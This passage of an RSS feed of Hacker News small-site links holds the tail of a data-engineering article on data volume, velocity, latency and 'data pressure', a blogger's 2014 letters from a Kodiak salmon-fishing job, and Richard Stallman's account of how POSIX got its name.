  <li><strong><em>Record/Message size</em></strong> For each current dataset, how big is a record, and at a static point in time how many records of that size are there? In a streaming context this can impose hard limitations on what technologies can be used (Kafka vs. Kinesis for example), in a static data warehousing context it may give ideas about current suboptimal data model design or heavy denormalization patterns along low latency paths in the data pipeline.</li>
  <li><strong><em>Data Footprint</em></strong>  The amount of data a company stores may not be reflective of the total data footprint the company has especially when taking into consideration data retention policies, data that is ephemeral or not stored anywhere, or query patterns which adopt patterns of heavy denormalization. In well-designed systems some denormalization will lend itself towards better separation between write and read latencies, but will result in a lot of duplicate data. Another example of necessary duplicate data is in RAID configurations or replication such as with HDFS, and backups. In other cases there may be unnecessary duplicate data. Its important to suss out instances of heavy data duplication, necessary or not, in order to get a sense for the total data footprint and distinguish between “raw” system data and derived data that the company has synthesized for various reasons.</li>
  <li><strong><em>Key Datasets</em></strong>  It may also be helpful to get a sense for what are the largest datasets a company deals with and the most frequently changing. Sometimes you can infer key elements about how that dataset may change over time, and thus the right strategy for designing around that dataset. For example if they say their largest dataset is “users” and they are a B2C retail company then you can infer that table is most likely to see heavy growth as the business grows, and will have higher demands for read and write latency.</li>
</ol>

<h3 id="desired-volume"><a name="desired"></a>Desired Volume:</h3>
<p>What is the volume of data the company “wishes” to be able to process in the system. “As much as possible” is not an option, it must be finite and realistic. Over provisioning data processing capacity can get expensive really quickly, especially on the higher ends. More open-ended needs and requirements around scaling can be approached using autoscaling or adaptive scheduling. If the answer is “we dont know” an effort should at least be made to help the company try to estimate.</p>
<h3 id="-anticipated-volume"><a name="anticipated"></a> Anticipated Volume:</h3>
<p>This is meant to bookend the previous point. Whereas as the desired volume is where the company wants to be in X years, the anticipated volume is where the company is most likely going to be within that time. This serves as a lower bound where the desired volume forms a rough upper bound. A less jarring way to discuss desired and anticipated volume (because after all what business is going to admit they aren’t going to grow as fast as they want, even though for most businesses the amount of data being handled is a bad vanity metric) is to simply discuss upper and lower bounds of needed capacity.</p>


<p><img src="https://theapex.io/assets/images/velocity.png" width="800"></p>
<p>Velocity is a measure of how quickly the data is moving over time regardless of the volume of data. Normally it’s hard to talk about data velocity without talking about its desired latencies or limits of time that you have in order to process the data which is usually imposed by external technical or business requirements. You can talk about roughly 3 types of velocity:</p>
<h3 id="input-velocity"><a name="input"></a>Input Velocity:</h3>
<p>How quickly is data coming into the system and how does the system need to accommodate that. This can be as simple as knowing that you only have batch access to the data (daily data dumps) vs stream access to a particular subset of the data, thus can only in best case scenario provide batch analytics on it. Or it can be as complex as planning very tailored distributed stream systems to get a specific input consumption rate.</p>
<h3 id="output-velocity"><a name="output"></a>Output Velocity:</h3>
<p>How quickly does the data need to be accessed or read. Typically this is tied to the front end of the process and the business use cases of how the data is being used. Limits on the associated output latency may vary for different subsets of the data, and may also make exchanges between consistency and availability (in the spirit of the <a href="https://en.wikipedia.org/wiki/CAP_theorem">CAP theorem</a>).  In plain terms, you may be willing to sacrifice accuracy of the data for getting it quicker, or you may opt to scale out further in order to get tighter control over both speed and accuracy.</p>
<h3 id="intra-velocity"><a name="intra"></a>Intra Velocity</h3>
<p>Intra latency is the amount of latency that is permissible between input and output velocity, or you can think of it between the various components of a data pipeline. Intra velocity in a data pipeline is a little harder to tack down. Usually this is either an operational metric, or something that is observed and optimized post-hoc. However, this doesn’t mean it isn’t important as it can have cascading effects on other parts of a data pipeline, sometimes in unexpected ways. In streaming systems back pressure engineering is one way to observe and respond dynamically to changes and levels of intra velocity.</p>

<p><img src="https://theapex.io/assets/images/cascading.gif" width="400"></p>
<p>Cascading failures are familiar to those that have designed tightly coupled stream systems</p>
<h4 id="end-to-end-latency">End to End Latency</h4>
<p>Putting together the three latencies associated with each of these and you arrive at what people typically refer to as “end to end” latency requirements, ie once a piece of data hits your system, how much time do you have before your analytics or end users will see the impact of that data. Keep in mind that varying business use cases may have varying requirements around end to end latency. It is not a universal metric. However, multiple data pipelines may end up affecting one particular end to end latency and may require you to more carefully engineer a particular pipeline to “keep pace” with other parts of the pipeline.</p>



<p>Before going onto Variety, I want to make a quick note about the relationship between Volume and Velocity as they don’t exist in isolation but in terms of planning are heavily dependent on one another. In order to do so I want to introduce the idea of “data pressure”.</p>

<p>You can think of Data Pressure as follows:</p>

<div><div><pre><code>Data Pressure = Data Volume x Data Velocity 
</code></pre></div></div>

<p><img src="https://theapex.io/assets/images/pressure.png" width="300"></p>

<p>In other words a relatively low desired data velocity might be offset by higher data volume and vice versa. This basically expresses the data volume in terms of total amount of data needed to be processed per unit time. It is interesting to look at the limits of data pressure. For example, a really low data volume but high input velocity may lend itself towards stream processing. However, if the needed output velocity on the opposite end of the process velocity is very low, say daily, then it may lend itself towards buffering and then batch processing. In short, the pressure expresses how much strain is put on particular parts of a system and what extra parts of the system may need to be designed intermediately in order to marry front and backend pressure demands gracefully. Those parts that feel more pressure than may need to be given special attention, for example, horizontal scaling, or other strategies such as breaking up the data pipeline stages differently.</p>

<p><img src="https://theapex.io/assets/images/dataflow.png" width="800"></p>
<p>Thinking in terms of total data volume per unit time</p>

<p>In some instances certain processes may not decrease the total data pressure but simply exchange one type of pressure for another. For example, batch processing may be slower, but will allow for processing much higher volumes efficiently, whereas you can avoid processing larger volumes by simply micro batch or stream processing at lower frequencies. One is not better than the other, one may simply be more strategically convenient than the other when you take the whole picture into account.</p>

<p><img src="https://theapex.io/assets/images/pressure2.png" width="800"></p>
<p>You can think of a query over larger dataset but same latency similarly to higher pressure demand on a physical system</p>

<p>The other useful aspect of thinking in terms of pressure is that you can also think in terms of pressure differentials, for example, suppose that you have a very large dataset which you need to query with low latency. In …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://theapex.io/4-vs-big-data">https://theapex.io/4-vs-big-data</a></em></p>]]>
            </description>
            <link>https://theapex.io/4-vs-big-data</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205610</guid>
            <pubDate>Wed, 25 Nov 2020 03:09:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Letters from Alaska]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25205393">thread link</a>) | @DoreenMichele
<br/>
November 24, 2020 | https://www.gabrielzzarate.com/blog/alaska | <a href="https://web.archive.org/web/*/https://www.gabrielzzarate.com/blog/alaska">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="___gatsby"><div tabindex="-1" id="gatsby-focus-wrapper"><div><section><article><p><em>The following are selections from letters I wrote to my fiancé in the summer of 2014 while working for a commercial salmon fishing company in Kodiak, Alaska.</em></p><h3 id="14-May-2014---Kodiak-Harbor"><a href="#14-May-2014---Kodiak-Harbor" aria-label="14 May 2014   Kodiak Harbor permalink"></a>14 May 2014 - Kodiak Harbor</h3><p>Here in the harbor, there are probably about a hundred large commercial fishing boats docked. Just about every evening, we have seen sea lions come swim amongst the boats! They will surface from time to time. They're huge and entertaining to watch.</p><p>I was a little frustrated while we were working today. James and I have been helping another guy named Jeff. I'm frustrated because both of them have more experience with construction work. Sometimes I'll show my inexperience, and become the joke on the job site. It doesn't bother me too much, but being on the bottom of the totem pole isn't where I like to be. It just gives me the incentive to learn the fishing knots quickly.</p><figure>
  <span>
      <span></span>
  <picture>
        <source srcset="https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/f3a60/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.webp 375w,https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/08b4d/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.webp 750w,https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/2b317/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.webp 1074w" sizes="(max-width: 1074px) 100vw, 1074px" type="image/webp">
        <source srcset="https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/bf173/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.jpg 375w,https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/acb04/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.jpg 750w,https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/edd00/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.jpg 1074w" sizes="(max-width: 1074px) 100vw, 1074px" type="image/jpeg">
        <img src="https://www.gabrielzzarate.com/static/7ac0ee8fb1779975df4997c9e927bb9e/edd00/4778D69B-63AB-4EE9-9F65-DE23C81EE62D_1_105_c.jpg" alt="Kodiak Harbor" title="Kodiak Harbor" loading="lazy">
      </picture>
    </span>
  <figcaption>Kodiak Harbor, Kodiak AK</figcaption></figure><h3 id="26-May-2014---Arriving-on-the-Island"><a href="#26-May-2014---Arriving-on-the-Island" aria-label="26 May 2014   Arriving on the Island permalink"></a>26 May 2014 - Arriving on the Island</h3><p>We arrived on Bear Island today. We took a flight from Kodiak to Larsen Bay, then hopped in the skiff to Bear. The scenery is beautiful, but our Island itself isn't much to look at. We got here and immediately started mending nets. A guy named Peter showed me how to tie the knots to mend the nets, and I'm getting the hang of it. Also, it turns out that our cook is great <!-- -->—<!-- --> what fantastic news! James and I were able to get a room together, just the two of us, which is nice.</p><figure>
  <span>
      <span></span>
  <picture>
        <source srcset="https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/f3a60/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.webp 375w,https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/08b4d/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.webp 750w,https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/a9a89/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.webp 1024w" sizes="(max-width: 1024px) 100vw, 1024px" type="image/webp">
        <source srcset="https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/bf173/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.jpg 375w,https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/acb04/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.jpg 750w,https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/72e01/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.jpg 1024w" sizes="(max-width: 1024px) 100vw, 1024px" type="image/jpeg">
        <img src="https://www.gabrielzzarate.com/static/f89410ff96af6f091d8634e81884f97b/72e01/BF8E47A7-EB6F-42F0-9EF8-00FE9E405794_1_105_c.jpg" alt="Bear Island" title="Bear Island" loading="lazy">
      </picture>
    </span>
  <figcaption>Bear Island</figcaption></figure><h3 id="28-May-2014---Hiking"><a href="#28-May-2014---Hiking" aria-label="28 May 2014   Hiking permalink"></a>28 May 2014 - Hiking</h3><p>Because the season doesn't begin till the 9th, we can't send out mail every day like we will be able to. Today was my second full day on the Island. I mend nets most of the day. The nice thing is I get a break after lunch, and I have been reading and napping. Maybe this summer I can learn to sleep so I can enjoy many long naps next to you. </p><p>I think a big part of passing the time and not going crazy will be the friendships. Tonight after dinner James, Luke, Micah, and I hiked up to the highest point on the Island. It's not that far, but there is a good view up there. Luke challenged us to sprint to the top, but we only got 3/4 of the way before we almost passed out breathless.</p><h3 id="31-May-2014---The-Bana"><a href="#31-May-2014---The-Bana" aria-label="31 May 2014   The Bana permalink"></a>31 May 2014 - The Bana</h3><p>The last two days have been challenging as far as work goes. The weather has been pretty bad, a gale came in yesterday (when the wind blows hard), and it was cold and rainy. But even though it hasn't been the best working conditions, we've kept our spirits up.</p><p>Last night was my first shower here. But they don't just shower; they use what they call a Bana. It's a giant sauna. We sit in there and sweat out all the nasty stuff, then rinse off. It is super relaxing, and I haven't felt so clean in my entire time here.</p><figure>
  <span>
      <span></span>
  <picture>
        <source srcset="https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/f3a60/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.webp 375w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/08b4d/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.webp 750w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/293e0/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.webp 1500w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/9a8a1/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.webp 2250w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/e72c3/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.webp 3000w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/c67aa/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.webp 4000w" sizes="(max-width: 1500px) 100vw, 1500px" type="image/webp">
        <source srcset="https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/bf173/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg 375w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/acb04/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg 750w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/c58a3/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg 1500w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/bd53b/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg 2250w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/12609/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg 3000w,https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/93719/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg 4000w" sizes="(max-width: 1500px) 100vw, 1500px" type="image/jpeg">
        <img src="https://www.gabrielzzarate.com/static/63dee56c867163ef1457bc38b838eb85/c58a3/956435E4-28BB-45DD-88FC-6CC15CF8092C_1_201_a.jpg" alt="Mike Falcochio" title="Mike Falcochio" loading="lazy">
      </picture>
    </span>
  <figcaption>Mike Falcochio</figcaption></figure><h3 id="6-June-2014---The-Season-Begins"><a href="#6-June-2014---The-Season-Begins" aria-label="6 June 2014   The Season Begins permalink"></a>6 June 2014 - The Season Begins</h3><p>Today is the second day of the season. Yesterday we got the nets out, and our first pick was pretty big. We only picked the nets once and brought in around 8,000 lbs, equal to like $16,000. Not bad for the first day. </p><p>When we put the nets out, I didn't take any medicine for sea-sickness, and we were out there in 36 mph winds with some pretty rocky seas. I threw up on three different occasions several times and now have those lovely broken blood vessel spots on my face. Now I've been taking Dramamine, and I've been fine. Unfortunately, a few guys are still getting sick even though they are taking medicine, including James.</p><p>This morning I was picking with Calvin, a 6' 5" guy with long curly blond hair that goes past his shoulders. He's super chill, goofy, and a prankster. Anyway, we had a great time. We were picking in one of the roughest nets, and I was in the front reaching to grab a rope over the side. A big wave came, pulling the rope away from me, and I didn't let go. I fell right over the side into the ocean. In a flash, Calvin ran to the front of the skiff to pull me back in. Haha, what a fun, cold dip in the ocean.</p><p>Being out amongst the weather and rough seas has reminded me of a fair bit of the boating accident, but not necessarily in a negative way. I think about it and thank God for using that experience to make me stronger and for allowing me to be back out there without fear. On the back of my orange rain jacket I wrote in Sharpie: "Joy follows suffering and life follows death" with Dad's and Earl's initials underneath. It's a proclamation to the ocean and the waves that even though that day on the Gulf was hard, God has made me stronger and brought me joy. The joy that comes from being in a love relationship with the King of the Universe, who calmed the seas and gives me hope that I will see both my Dads again.</p><figure>
  <span>
      <span></span>
  <picture>
        <source srcset="https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/f3a60/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.webp 375w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/08b4d/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.webp 750w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/293e0/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.webp 1500w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/9a8a1/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.webp 2250w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/e72c3/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.webp 3000w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/c67aa/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.webp 4000w" sizes="(max-width: 1500px) 100vw, 1500px" type="image/webp">
        <source srcset="https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/bf173/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg 375w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/acb04/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg 750w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/c58a3/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg 1500w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/bd53b/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg 2250w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/12609/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg 3000w,https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/93719/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg 4000w" sizes="(max-width: 1500px) 100vw, 1500px" type="image/jpeg">
        <img src="https://www.gabrielzzarate.com/static/310ec54e15d123748fa624e6287b092e/c58a3/49A141FF-08C4-4277-9695-E3266E73284B_1_201_a.jpg" alt="Calvin" title="Calvin" loading="lazy">
      </picture>
    </span>
  <figcaption>Calvin Bulthuis</figcaption></figure><h3 id="10-June-2014"><a href="#10-June-2014" aria-label="10 June 2014 permalink"></a>10 June 2014</h3><p>We had an extended break today because of the weather, so I've been getting extra rest. My back and hands are very sore, so much so that I have to take breaks as I write this letter. They say that the soreness goes away after a few more weeks.</p><h3 id="11-June-2014---Heads-or-Tails"><a href="#11-June-2014---Heads-or-Tails" aria-label="11 June 2014   Heads or Tails permalink"></a>11 June 2014 - Heads or Tails</h3><p>Yesterday I was picking with Luke when we caught a herring in the net (a herring is a small salmon, a little longer than my hand). He picked it up and said, "Heads or tails, Gabe?" I didn't understand what he meant but replied, "tails." He bit off the head, spit it out, and handed me the rest! So I bit off the tail. Nasty stuff! Guys on the crew said the tail is worse because it's where...well, I'll let you imagine what comes out near the tail.</p><h3 id="12-June-2014"><a href="#12-June-2014" aria-label="12 June 2014 permalink"></a>12 June 2014</h3><p>How long is it taking my letters to arive in Greenville? If the weather is good, your letters have been getting here in five to six days, which is quicker than I expected.</p><figure>
  <img src="https://www.gabrielzzarate.com/4e23b322945544755406648171c24d28/low_quality_day_on_the_job-3.gif" alt="A Nice Day on the Job">
  <figcaption>A day on the job. Heavy on the sunshine, light on the fish.</figcaption></figure><h3 id="14-June-2014"><a href="#14-June-2014" aria-label="14 June 2014 permalink"></a>14 June 2014</h3><p>There's not much new to tell here. We've done well as far as the amount of fish we've caught. I think we are close to me the 100,000 lbs mark.</p><p>Can you send me an update on the World Cup? You can probably print out what the scores have been and who scored during the games. That would be awesome.</p><h3 id="17-June-2014"><a href="#17-June-2014" aria-label="17 June 2014 permalink"></a>17 June 2014</h3><p>It's been storming here for the past few days, so we haven't been able to pick the nets three times a day. It seems like we've been fishing for a long time, but we are just getting started in reality. It can be too overwhelming to dwell on how much time I still have to be on this Island. I prefer to take the days one at a time.</p><p>You asked about who I am close to up here. I get along decently well with everyone. Luke is from Charleston. He's a loner and a wild one; he's hiked the Appalachian Trail by himself. In the off-season, he lives in Hawaii and surfs every day. Calvin is also another guy I like. I can't say I am close to anyone yet, though.</p><p>I was so glad to receive your letters today. I love you, Caitlyn. There's a guy named Mike who has a pretty pessimistic view of marriage. He has made a few jokes about getting married to the first girl I started dating, saying that I don't know if there is something else out there better. My response is that I know plenty of girls, and they all represent confirmation after confirmation that what I have is far better. xo :)</p><h3 id="21-June-2014---Summer-Solistice"><a href="#21-June-2014---Summer-Solistice" aria-label="21 June 2014   Summer Solistice permalink"></a>21 June 2014 - Summer Solistice</h3><p>Today is the summer solstice, and they say that the sun won't set until 1 am. The closure was two days long and was a nice break from fishing. The sun has been out for the last two days as well. We haven't seen the sunshine very much.</p><p>I want to hear from you. How did the wedding dress shopping go?</p><figure>
  <span>
      <span></span>
  <picture>
        <source srcset="https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/f3a60/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.webp 375w,https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/08b4d/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.webp 750w,https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/8b983/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.webp 768w" sizes="(max-width: 768px) 100vw, 768px" type="image/webp">
        <source srcset="https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/bf173/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.jpg 375w,https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/acb04/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.jpg 750w,https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/212bf/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.jpg 768w" sizes="(max-width: 768px) 100vw, 768px" type="image/jpeg">
        <img src="https://www.gabrielzzarate.com/static/531ac5d8181fcf31e455f32509daf307/212bf/9C2D88F8-2EBA-4ADE-AFBC-CD8F4507161D_1_105_c.jpg" alt="The Crew" title="The Crew" loading="lazy">
      </picture>
    </span>
  <figcaption>The Crew (left to right): Luke Yarborough, Josh Krohn, Evan Dundas, Adam Wilson, Calvin Bulthus, James Peery, Micah Glassman, Gabriel Zarate, Casey Furnish, Mike Falcochio, Moreno, Mark Barnes</figcaption></figure><h3 id="24-June-2014---The-Crew"><a href="#24-June-2014---The-Crew" aria-label="24 June 2014   The Crew permalink"></a>24 June 2014 - The Crew</h3><p>There are 12 crewmen in total. Mike is from Louisiana and has been coming up to work for the Fields for the last seven years! He is given a lot of responsibility for the crew and is a nice guy. Adam, Casey, and Mark are all from Florida. Adam is a big guy with lots of tattoos and is a big, fat southern teddy bear. Casey annoys me the most probably. He likes to talk a lot and try to tell me what to do when he doesn't know what he's doing himself. Mark is interesting. He has done some pretty hard drugs and tells some wild stories. Micah and Evan are the young guys from Idaho. They are both eighteen and are farm boys. Peter is from California but lives in Tennessee. He's a climber, and we have some great conversations. He wants to go to seminary and seems to love people. Luke is a surfer from Charleston and is a relaxed but funny guy. Then there's Calvin, who is the long, curly-haired giant who has the most infectious smile. What a goofball. Josh is also from California and is not my favorite.</p><p>Kelsey is the cook. She makes delicious food and has a no-nonsense attitude that is good for a girl in her position. Overall it is a great group. We laugh a lot.</p><p>So you found the dress! I could feel your excitement even through the letter, so I know it must be the right one. I'm so curious about it now!</p><p>The sun has been shining here for the past few days. It's been so great to have better weather. I got stung by some jellyfish this afternoon. It's no big deal, just an irritating stinging sensation. </p><figure>
  <span>
      <span></span>
  <picture>
        <source srcset="https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/f3a60/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.webp 375w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/08b4d/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.webp 750w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/293e0/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.webp 1500w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/9a8a1/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.webp 2250w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/e72c3/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.webp 3000w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/c67aa/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.webp 4000w" sizes="(max-width: 1500px) 100vw, 1500px" type="image/webp">
        <source srcset="https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/bf173/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg 375w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/acb04/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg 750w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/c58a3/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg 1500w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/bd53b/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg 2250w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/12609/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg 3000w,https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/93719/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg 4000w" sizes="(max-width: 1500px) 100vw, 1500px" type="image/jpeg">
        <img src="https://www.gabrielzzarate.com/static/07ba47a76ff4173a574b2e4f02d65d09/c58a3/63A2ABC4-E622-4C44-B73A-4E108A321BB9_1_201_a.jpg" alt="Bear Island at Sunset" title="Bear Island at Sunset" loading="lazy">
      </picture>
    </span>
  <figcaption>Backside of Bear at Sunset</figcaption></figure><h3 id="26-June-2014"><a href="#26-June-2014" aria-label="26 June 2014 permalink"></a>26 June 2014</h3><p>I keep coming back to the concept of contentment. Sometimes I try to count the days, and I can get discouraged. Not just a little down, like really discouraged. I can't wait to return.</p><h3 id="27-June-2014"><a href="#27-June-2014" aria-label="27 June 2014 permalink"></a>27 June 2014</h3><p>I think the most significant prayer request would be endurance to keep going. It's long hours and long days here, and there's a long way to go. Some mornings it's tough to get up and get going. Once I get up and eat breakfast, things get better.</p><h3 id="3-July-2014"><a href="#3-July-2014" aria-label="3 July 2014 permalink"></a>3 July 2014</h3><p>After every morning pick, there is usually a couple of hours for shore work before lunch (depending on how long the pick takes). For the last two days, I've been working in the …</p></article></section></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.gabrielzzarate.com/blog/alaska">https://www.gabrielzzarate.com/blog/alaska</a></em></p>]]>
            </description>
            <link>https://www.gabrielzzarate.com/blog/alaska</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205393</guid>
            <pubDate>Wed, 25 Nov 2020 02:33:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Origin of the Name Posix]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25205384">thread link</a>) | @wooby
<br/>
November 24, 2020 | https://stallman.org/articles/posix.html | <a href="https://web.archive.org/web/*/https://stallman.org/articles/posix.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<h2><a href="https://stallman.org/">https://stallman.org</a></h2>
<p>
For current political commentary, see
the <a href="https://stallman.org/archives/polnotes.html">daily
political notes</a>.
</p>
<p>
<a href="https://stallman.org/biographies.html#serious">RMS's Bio</a> |
<a href="http://gnu.org/">The GNU Project</a>
</p>

<hr>



<h2>2011-05-11</h2>

<p>
In the 1980s I was in the IEEE committee that wrote the standard that
ultimately became known as POSIX.  The committee set itself the task
of standardizing interface specs for a Unix-like system, but had no
short name for its work.  When the first part of the specification was
ready, someone gave it the name "IEEEIX", with a subtitle that
included "Portable Operating System" — perhaps "Specifications
for a Portable Operating System".
</p>
<p>
It seemed to me that nobody would ever say "IEEEIX", since the
pronunciation would sound like a shriek of terror; rather, everyone
would call it "Unix".  That would have boosted AT&amp;T, the GNU
Project's rival, an outcome I did not want.  So I looked for another
name, but nothing natural suggested itself to me.
</p>
So I put the initials of "Portable Operating System" together with the
same suffix "ix", and came up with "POSIX".  It sounded good and I saw
no reason not to use it, so I suggested it.  Although it was just
barely in time, the committee adopted it.

<p>
I think the administrators of the committee were as relieved as I was
to give the standard a pronounceable name.
</p>
<p>
Copyright (c) 2011 Richard Stallman
Verbatim copying and redistribution of this entire page are
permitted provided this notice is preserved.
</p>


</div>]]>
            </description>
            <link>https://stallman.org/articles/posix.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25205384</guid>
            <pubDate>Wed, 25 Nov 2020 02:33:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[C is not a subset of C++: A simple program to show differences in the standards]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25205170">thread link</a>) | @abqexpert
<br/>
November 24, 2020 | https://abqexpert.com/2020/11/24/c-is-not-a-subset-of-c-a-simple-program-to-show-differences-in-the-c-and-c-standards/ | <a href="https://web.archive.org/web/*/https://abqexpert.com/2020/11/24/c-is-not-a-subset-of-c-a-simple-program-to-show-differences-in-the-c-and-c-standards/">archive.org</a>
